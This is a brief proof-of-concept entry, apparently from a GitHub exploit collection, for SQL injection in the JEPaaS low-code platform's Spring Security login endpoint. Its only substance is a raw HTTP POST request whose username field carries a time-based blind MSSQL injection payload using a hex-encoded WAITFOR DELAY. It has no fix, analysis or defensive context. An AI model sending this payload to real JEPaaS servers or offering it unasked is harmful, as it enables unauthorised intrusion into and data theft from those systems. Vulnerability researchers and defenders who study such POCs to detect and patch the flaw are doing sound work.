# jepaas_j_spring_security_check_sqli

from: https://github.com/wy876/POC/blob/main/JEPaaS%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0j_spring_security_check%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

```
POST /j_spring_security_check HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--
```
